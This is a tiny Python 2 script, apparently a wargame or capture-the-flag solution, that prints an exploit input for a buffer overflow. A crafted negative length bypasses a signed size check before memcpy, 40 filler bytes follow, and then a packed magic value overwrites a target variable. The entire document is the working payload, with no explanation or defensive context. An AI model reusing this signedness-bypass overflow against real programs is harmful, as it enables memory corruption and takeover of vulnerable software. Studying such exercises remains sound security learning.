import struct

number_for_memcpy = "-2147483637"
buffer_filler = "A" * 40
wanted_value = struct.pack('I', 0x574f4c46)

print  number_for_memcpy + " " + buffer_filler + wanted_value
